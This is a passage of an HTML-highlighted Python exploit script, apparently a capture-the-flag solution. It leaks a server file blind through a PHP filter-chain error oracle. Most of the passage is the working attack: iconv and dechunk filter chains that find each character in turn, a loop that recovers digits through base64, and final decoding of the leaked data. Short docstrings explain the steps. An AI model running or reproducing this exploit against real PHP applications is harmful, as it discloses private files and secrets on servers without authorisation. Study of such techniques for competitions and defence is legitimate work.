class="line"><span class="string">want, to access all the characters in the string ;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flip = <span class="string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span></span><br><span class="line">r4 = <span class="string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nth</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> flip, r2, r4</span><br><span class="line">    o = []</span><br><span class="line">    chunk = n // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> chunk % <span class="number">2</span> == <span class="number">1</span>: o.append(r4)</span><br><span class="line">    o.extend([flip, r4] * (chunk // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) ^ (chunk % <span class="number">2</span> == <span class="number">1</span>): o.append(r2)</span><br><span class="line">    <span class="keyword">return</span> join(*o)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step 3:</span></span><br><span class="line"><span class="string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span></span><br><span class="line"><span class="string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span></span><br><span class="line"><span class="string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span></span><br><span class="line"><span class="string">I just bruteforced every combination of iconv filters to find these.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span></span><br><span class="line"><span class="string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span></span><br><span class="line"><span class="string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span></span><br><span class="line"><span class="string">string to figure out which number it is.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rot1 = <span class="string">&#x27;convert.iconv.437.CP930&#x27;</span></span><br><span class="line">be = <span class="string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span></span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_letter</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># a-f A-F 0-9</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># a-e</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;edcba&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># A-E</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;EDCBA&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># f</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;f&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># F</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># n-s N-S</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># n-r</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;rqpon&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># N-R</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;RQPON&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># s</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># S</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># i j k</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;k&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;j&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># I J K</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;K&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;J&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;I&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># v w x</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;v&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># V W X</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;W&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;V&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># Z</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># z</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># M</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># m</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># y</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;y&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># Y</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># l</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># L</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># h</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;h&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># H</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># u</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;u&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># U</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;U&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># g</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;g&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># G</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;G&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># t</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;t&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># T</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>&#x27;</span></span><br><span class="line">    letter = find_letter(prefix)</span><br><span class="line">    <span class="comment"># it&#x27;s a number! check base64</span></span><br><span class="line">    <span class="keyword">if</span> letter == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span></span><br><span class="line">        s = find_letter(prefix)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            <span class="comment"># 0 - 3</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">            <span class="comment"># 4 - 7</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">            <span class="comment"># 8 - 9</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(end=letter)</span><br><span class="line">    o += letter</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">We are done!! :)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">d = b64decode(o.encode() + <span class="string">b&#x27;=&#x27;</span> * <span class="number">4</span>)</span><br><span 